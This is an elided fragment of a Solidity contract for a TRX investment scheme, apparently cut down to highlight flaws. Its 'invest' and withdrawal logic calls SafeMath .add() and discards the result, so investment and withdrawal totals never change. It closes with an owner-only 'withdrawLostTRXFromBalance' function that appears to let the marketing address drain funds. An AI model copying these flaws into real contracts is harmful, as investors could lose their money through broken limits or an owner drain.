...
contract Tronexy_Global {
	...
	function invest(address referrer) public payable {
		...
		user.investedTotal.add(msg.value);
		user.blocked=false;
	...
	//	uint256 userPercentRate = getUserPercentRate(msg.sender);
    	...
    	totalAmount=getUserAvailableBalanceForWithdrawal(msg.sender);
		...
		if(totalAmount.add(user.withdrawTotal) > user.investedTotal.mul(2))
		{
			...
			if(rest_amount >0)
			{
				user.holdbonus.add(totalAmount.sub(rest_amount));
				user.withdrawTotal.add(rest_amount);
			...
			user.withdrawTotal.add(totalAmount);			
	...
	function withdrawLostTRXFromBalance(address payable _sender) public {
        require(msg.sender == marketingAddress, "onlyOwner");
